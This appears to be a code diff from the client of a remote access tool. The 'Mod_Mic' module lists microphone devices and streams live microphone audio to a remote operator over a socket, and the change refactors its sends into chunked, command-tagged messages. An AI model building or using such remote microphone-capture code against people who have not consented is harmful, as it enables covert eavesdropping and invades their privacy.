@@ -31,23 +31,19 @@ std::vector<std::string> Mod_Mic::m_ObtenerDispositivos() {
 void Mod_Mic::m_Enviar_Dispositivos() {
     
     std::vector<std::string> vc_devices = this->m_ObtenerDispositivos();
-    std::string strSalida = "";
+    std::string strSalida = "No hay dispositivos";
 
     if (vc_devices.size() > 0) {
-        strSalida = std::to_string(EnumComandos::Mic_Refre_Resultado);
-        strSalida.append(1, CMD_DEL);
+        strSalida = "";
         for (auto strDevice : vc_devices) {
             strSalida += strDevice;
             strSalida.append(1, CMD_DEL);
         }
-        strSalida = strSalida.substr(0, strSalida.size() - 1);
-        cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false, nullptr);
-    }
-    else {
-        strSalida = "No hay dispositivos";
+        strSalida.pop_back();
+
     }
 
-    cCliente->cSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, false, nullptr);
+    cCliente->cChunkSend(this->sckSocket, strSalida.c_str(), strSalida.size(), 0, true, nullptr, EnumComandos::Mic_Refre_Resultado);
 }
 
 void Mod_Mic::m_EmpezarLive() {
@@ -67,10 +63,8 @@ void Mod_Mic::m_DetenerLive() {
 
 void Mod_Mic::m_LiveMicTh() {
     std::string strMSG = "[!] thLiveMic iniciada, dispositivo#: ";
-    strMSG += std::to_string(this->p_DeviceID);
-    DebugPrint(strMSG);
-    strMSG.clear();
-
+    DebugPrint(strMSG, this->p_DeviceID);
+    
     // Definir el formato de audio
     WAVEFORMATEX wfx = {};
     wfx.wFormatTag = WAVE_FORMAT_PCM;
@@ -141,21 +135,16 @@ void Mod_Mic::m_LiveMicTh() {
 
     //Real time
     // Bucle principal de captura y envío de audio
-    std::string strHeader = std::to_string(EnumComandos::Mic_Live_Packet);
-    strHeader.append(1, CMD_DEL);
-    int iHeaderSize = strHeader.size();
-    int iBuffsize = BUFFER_SIZE + iHeaderSize;
+    int iBuffsize = BUFFER_SIZE;
     
     std::vector<char> newBuffer(iBuffsize);
-    std::memcpy(newBuffer.data(), strHeader.c_str(), iHeaderSize);
-
+    
     while (this->isLiveMic) {
         if (headers.dwFlags & WHDR_DONE) {
-            // Enviar datos de audio al servidor
-            std::memcpy(newBuffer.data() + iHeaderSize, headers.lpData, headers.dwBufferLength);
+            std::memcpy(newBuffer.data(), headers.lpData, headers.dwBufferLength);
                 
-            cCliente->cSend(this->sckSocket, newBuffer.data(), iBuffsize, 0, true, nullptr);
-            
+            cCliente->cChunkSend(this->sckSocket, newBuffer.data(), iBuffsize, 0, true, nullptr, EnumComandos::Mic_Live_Packet);
+
             if (waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
                 break;
             }
@@ -172,11 +161,7 @@ void Mod_Mic::m_LiveMicTh() {
     }
     waveInClose(wi);
 
-    strMSG = std::to_string(EnumComandos::Mic_Stop);
-    strMSG.append(1, CMD_DEL);
-    strMSG.append(1, '0');
-
-    cCliente->cSend(cCliente->sckSocket, strMSG.c_str(), strMSG.size(), 0, false, nullptr);
+    cCliente->cChunkSend(cCliente->sckSocket, "0", 1, 0, true, nullptr, EnumComandos::Mic_Stop);
 
     strMSG = "[!] thLiveMicTh finalizada";
     DebugPrint(strMSG);
